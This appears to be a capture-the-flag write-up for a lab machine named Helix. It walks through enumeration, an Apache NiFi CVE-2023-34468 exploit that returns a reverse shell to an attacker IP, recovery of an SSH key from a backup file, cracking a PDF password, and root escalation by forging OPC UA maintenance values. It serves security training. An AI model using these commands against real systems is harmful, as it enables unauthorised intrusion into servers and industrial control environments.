# Analysis and Enumeration Report

---

# 1. Initial Scan

A reconnaissance scan was performed against target `10.129.245.123` in order to identify exposed services and obtain an initial view of the attack surface. During this phase, two open ports were detected: `22/tcp`, corresponding to SSH, and `80/tcp`, corresponding to the web service running under nginx.

The analysis also showed that the HTTP service redirected to the domain `helix.htb`, so it was necessary to associate that name with the local host in order to continue the enumeration.

**Command used:**

```bash
nmap -sS --open -sC -sV -n -Pn 10.129.245.123
```

<img width="1769" height="633" alt="image" src="https://github.com/user-attachments/assets/3aa5ecf8-f3e4-4037-b7dc-65ee5698bb99" />

**Recommendations:**

- Restrict SSH access by IP or VPN.
- Keep exposed services updated.
- Review whether the host should respond with public redirections.

---

# 2. Initial Web Enumeration

After configuring domain resolution, the main page of the web service was accessed to analyze its content and identify possible interaction points. The application responded correctly with code `200 OK` and displayed a corporate page related to Helix Industries, focused on industrial automation and critical infrastructure.

During this phase, basic headers and metadata from the server were also identified, including the use of nginx on Ubuntu and the presence of a visible contact email address in the content.

**Command used:**

```bash
whatweb http://helix.htb/
```

<img width="2082" height="842" alt="image" src="https://github.com/user-attachments/assets/6a62adeb-6e25-4995-b8e9-f52f9872ed01" />

**Recommendations:**

- Reduce the information exposed in the frontend.
- Avoid showing emails or contact details in clear text if not necessary.
- Review which metadata and headers are being publicly disclosed.

---

# 3. Manual Testing

Manual testing of the web application was performed in order to understand its behavior and identify possible interaction points. However, no relevant element was found that could be interacted with directly, so this phase was limited to a visual and basic functional review of the exposed content.

<img width="2268" height="1438" alt="image" src="https://github.com/user-attachments/assets/37f403c3-c85c-467c-893d-8913e5e52e2f" />

**Recommendations:**

- Minimize unnecessary public exposure.
- Review which content is accessible without authentication.
- Avoid showing static information that does not add value to the end user.

---

# 4. Subdomain Discovery

Because the web service appeared to be deployed on a virtual-host-based infrastructure, subdomain enumeration was performed by fuzzing the `Host` header. The goal of this phase was to identify additional services exposed under the main domain `helix.htb`.

During the first pass with a reduced wordlist, the subdomain `flow` was detected. The search was then expanded with a larger wordlist to confirm whether any other virtual hosts existed, although no additional relevant results were obtained.

**Commands used:**

```bash
ffuf -u http://helix.htb/ -H "Host: FUZZ.helix.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 154
ffuf -u http://helix.htb/ -H "Host: FUZZ.helix.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 154
```

<img width="1371" height="733" alt="image" src="https://github.com/user-attachments/assets/d7399804-35c7-45d3-b464-f2a21fa0494a" />

<img width="1595" height="968" alt="image" src="https://github.com/user-attachments/assets/2da546b3-46ec-4b43-853b-1949f2b85e66" />

**Recommendations:**

- Reduce exposure of unnecessary subdomains.
- Protect internal services with strong authentication.
- Avoid differentiated responses that make reconnaissance easier.

---

# 5. Subdomain Review

Once the subdomain was identified, a manual review of its behavior was performed to analyze its function, check the available options, and determine the version of the technology in use. This phase helped expand enumeration and better define possible attack paths.

<img width="1731" height="830" alt="image" src="https://github.com/user-attachments/assets/2ececbc0-09a8-41a5-83c2-b207edadb54b" />

**Recommendations:**

- Restrict access to internal services.
- Hide publicly exposed version information.
- Review whether the subdomain should be available without additional control.

---

# 6. Crawling and Route Enumeration

A crawl was then executed on the subdomain to locate APIs, internal routes, and other resources that may have been missed during the manual review. The results showed mainly static files and internal references from the NiFi environment, without providing any useful additional access at that time.

**Command used:**

```bash
katana -u http://flow.helix.htb/nifi/ -jc -kf all -d 10
```

<img width="1828" height="877" alt="image" src="https://github.com/user-attachments/assets/d5af2325-40ce-403b-b61a-d79bc38eeb26" />

**Recommendations:**

- Limit the exposure of internal routes.
- Avoid publishing unnecessary static resources.
- Review the service structure to prevent easy enumeration.

---

# 7. Version Identification

Once it was identified that the exposed version was Apache NiFi 1.21.0, both the main page on port 80 and the subdomain were reviewed to better understand the service and its attack surface. Based on this information, publicly available exploits related to the detected technology were investigated.

During the review, a Metasploit module associated with CVE-2023-34468 appeared, targeting Apache NiFi H2 RCE. The module was tested several times with different parameters and payloads, but it did not provide a functional session, so it was discarded as a direct exploitation path at that moment.

**Commands used:**

```bash
msfconsole
use exploit/linux/http/apache_nifi_h2_rce
options
set RHOSTS 10.129.227.225
run
```

<img width="1108" height="616" alt="image" src="https://github.com/user-attachments/assets/9584396e-cbe4-401f-bf5a-2da01a2684d2" />

<img width="1834" height="880" alt="image" src="https://github.com/user-attachments/assets/5913585b-11d0-4a0f-963e-3a629b0a2528" />

**Recommendations:**

- Keep Apache NiFi updated.
- Restrict access to administration interfaces.
- Review the exposure of components that allow dynamic execution.

---

# 8. Exploitation Search

Once the service version had been identified, enumeration was expanded using fuzzing in order to find additional endpoints or hidden content. However, the results did not reveal any more useful routes or alternative services, confirming that the attack surface was limited to the analyzed subdomain. In this situation, a public GitHub exploit was tested, which eventually allowed interactive access to the system.

<img width="1501" height="720" alt="image" src="https://github.com/user-attachments/assets/ce1340dc-ab9d-4454-b254-a0cbf11b0bf2" />

**Command used:**

```bash
python3 CVE-2023-34468_poc.py --target http://flow.helix.htb --lhost 10.10.14.54 --lport 4444 --cleanup
```

<img width="1684" height="808" alt="image" src="https://github.com/user-attachments/assets/e60a5bad-2c9f-4d32-b694-135908a7f1ef" />

<img width="1604" height="794" alt="image" src="https://github.com/user-attachments/assets/ba7d16ff-eecf-484d-98cf-94afb0858c7f" />

**Recommendations:**

- Apply security patches continuously.
- Do not expose critical services without authentication.
- Limit remote execution possibilities in administration components.

---

# 9. Initial System Access

Once the initial shell as user `nifi` was obtained, the system was enumerated to identify local accounts and better understand the compromised environment. Reviewing `/etc/passwd` revealed service accounts such as `nifi`, `plc`, and `operator`, in addition to other standard system accounts.

The current user identity was then confirmed, and the NiFi installation directory was explored, verifying the typical service structure and the presence of several directories related to internal repositories, configuration, extensions, and logs.

**Commands used:**

```bash
cat /etc/passwd
id
script /dev/null
```

<img width="1758" height="1029" alt="image" src="https://github.com/user-attachments/assets/36dc014e-5a95-4fe1-9a76-3f24837a3e83" />

**Recommendations:**

- Review the presence of unnecessary service accounts.
- Restrict permissions on installation directories.
- Protect sensitive information exposed in service configuration.

---

# 10. Finding in `support-bundles`

During local enumeration of the NiFi installation directory, several system components were reviewed. In this exploration, the `support-bundles` directory was located, inside which a file named `operator_id_ed25519.bak` appeared, which was noteworthy because it looked like a copy of a private key or a backup associated with the `operator` user.

This finding suggested the possible existence of reusable credentials or sensitive material exposed on disk, and it became one of the key focus points for later enumeration phases.

**Commands used:**

```bash
ls
cd support-bundles
ls
```

<img width="1520" height="681" alt="image" src="https://github.com/user-attachments/assets/a21cea39-79cf-4569-80ce-3b44d7e689c4" />

**Recommendations:**

- Do not store copies of private keys in accessible directories.
- Protect credential backups with strict permissions.
- Review and remove unnecessary sensitive artifacts.

---

# 11. Recovered Private Key

During the review of the `support-bundles` directory, a file named `operator_id_ed25519.bak` was found, and its contents corresponded to an OpenSSH private key. This was especially relevant because it provided a possible additional access path using SSH authentication with the `operator` user.

**Command used:**

```bash
cat operator
```

**Content:**

```text
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

<img width="1520" height="681" alt="image" src="https://github.com/user-attachments/assets/fcfc8b5c-e012-4dd9-9450-afd91c5b06e5" />

**Recommendations:**

- Do not leave private key copies on disk.
- Protect any sensitive backup with strict permissions.
- Review support artifacts so they do not expose reusable credentials.

---

# 12. SSH Access

Once the private key had been recovered, the file was downloaded locally and used to establish an SSH connection with the `operator` user on the target. The access was successful and allowed an interactive session on the Ubuntu system, confirming that the key corresponded to a valid account on the host.

After logging in, the system displayed general host information, including the Ubuntu version, disk usage, and the internal IP address of the host. From that point onward, enumeration continued from a more privileged position than the previous shell.

**Command used:**

```bash
ssh -i operator.key operator@10.129.245.123
```

<img width="2057" height="986" alt="image" src="https://github.com/user-attachments/assets/4a335df3-de7d-419f-908f-ce625d829462" />

**Recommendations:**

- Avoid reusing private keys in backup files.
- Revoke exposed credentials in accessible directories.
- Review SSH access for service accounts and limit it when not necessary.

---

# 13. Additional Local Enumeration

After accessing the system via SSH as `operator`, local enumeration of the environment continued and available configuration and documentation files were reviewed. During this phase, the NiFi configuration directory was inspected, and an attempt was made to check information related to host services, although the expected file in `/etc/helix/config.ini` was not found.

Later, two files of interest were downloaded locally from the user’s home directory: `Operator Control & Safety Guide.pdf` and `control systems diagram.png`. Both documents proved useful for better understanding the architecture of the environment and the general behavior of the system controlled by Helix.

**Commands used:**

```bash
cd /opt/nifi-1.21.0/conf
ls
cat /etc/helix/config.ini
sudo systemctl status helix-opc
scp -i operator.key operator@10.129.245.123:"/home/operator/Operator\ Control\ \&\ Safety\ Guide.pdf" ./Guia_Helix.pdf
scp -i operator.key operator@10.129.245.123:"/home/operator/control\ systems\ diagram.png" ./Diagrama_Helix.png
```

<img width="1456" height="533" alt="image" src="https://github.com/user-attachments/assets/1296f4b4-315b-4f9d-b16b-51a01ab4ae7d" />

**Recommendations:**

- Document and protect sensitive operational files.
- Avoid leaving manuals or diagrams accessible without control.
- Review permissions on technical environment information.

---

# 14. Protected PDF

When the PDF was opened, it was confirmed to be password-protected, which raised suspicion that it could contain sensitive information or important internal documentation. Because of that, its hash was extracted in order to attempt password recovery and understand what information was being protected.

A dictionary attack using `rockyou.txt` successfully recovered the document password, which turned out to be `operator1`. This confirmed that the file was not meant to store direct credentials, but rather protected internal documentation that deserved further analysis.

**Commands used:**

```bash
cat hash_pdf.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --encoding=ISO-8859-1 hash_pdf.txt
```

<img width="1442" height="430" alt="image" src="https://github.com/user-attachments/assets/d493b011-8e62-46e4-8a3c-71908620c324" />

**Recommendations:**

- Protect sensitive documents with strong passwords.
- Avoid weak or predictable passwords.
- Review the content of guides and internal manuals so they do not expose critical information.

---

# 15. Documentation Analysis

During the system enumeration, several files were found in the configuration directory that did not initially appear especially relevant. Before going deeper into them, an attempt was made to find a password, a poorly stored credential, or any sensitive data that could facilitate access to other parts of the environment, although no useful result was obtained in that direction.

Over time, those files were reviewed more carefully because the presence of a PDF guide and a PNG diagram inside such a configuration-oriented directory was notable. This suggested that they could provide context about the system architecture or internal operation rather than directly reusable credentials.

<img width="1131" height="769" alt="image" src="https://github.com/user-attachments/assets/f22387c2-c3e1-44d8-8c69-51b38913eb8a" />

<img width="1343" height="968" alt="image" src="https://github.com/user-attachments/assets/a4d1345b-8649-40f6-9f30-222b07162ce8" />

**Recommendations:**

- Separate operational documentation from configuration directories.
- Protect internal manuals with access control.
- Avoid storing sensitive material in predictable locations.

---

# 16. Privilege Escalation to Root

Privilege escalation to root was based on a very specific operational condition in the environment, also described in the recovered documentation. After reviewing the privileges of the `operator` user, it was confirmed that the binary `/usr/local/sbin/helix-maint-console` could be executed as root without a password.

The PDF guide also indicated that, in order to activate privileged access, it was necessary to simulate a system maintenance state. For this purpose, several values were modified using OPC UA writes, setting the operating mode to `MAINTENANCE`, enabling the corresponding flag, and adjusting the temperature to a value above the expected threshold.

Once those conditions were met, executing `helix-maint-console` granted temporary privileged access to the system, making it possible to obtain a root shell and read the `root.txt` file.

**Commands used:**

```bash
sudo -l
uawrite -u opc.tcp://127.0.0.1:4840/helix/ -n "ns=2;i=12" -t string "MAINTENANCE"
uawrite -u opc.tcp://127.0.0.1:4840/helix/ -n "ns=2;i=13" -t bool true
uawrite -u opc.tcp://127.0.0.1:4840/helix/ -n "ns=2;i=6" -t double 11.0
sudo /usr/local/sbin/helix-maint-console
cat /root/root.txt
```

<img width="2091" height="678" alt="image" src="https://github.com/user-attachments/assets/9dac7b9f-484d-4cb4-90ef-a5ed02a8b531" />

**Recommendations:**

- Carefully review binaries delegated with sudo.
- Do not rely on operational conditions that are easy to manipulate.
- Validate that maintenance modes cannot be activated externally without additional controls.

---

# 17. Final Results

During the analysis, initial access was achieved through exploitation of the Apache NiFi service, an initial shell as user `nifi` was obtained, a reusable private key was then found to access `operator` via SSH, and finally root escalation was achieved by manipulating the system maintenance state.

The compromise of the host was fully completed, demonstrating a chain of exposure made up of insufficient enumeration, reusable credentials, and weak validation of operational conditions.

**Artifacts obtained:**

- `user.txt`
- `root.txt`

**Attack diagram:**

```text
Nmap
↓
helix.htb
↓
FFUF
↓
flow.helix.htb
↓
Apache NiFi 1.21.0
↓
CVE-2023-34468
↓
Shell (nifi)
↓
operator_id_ed25519.bak
↓
SSH operator
↓
PDF + OPC UA
↓
sudo helix-maint-console
↓
root
```
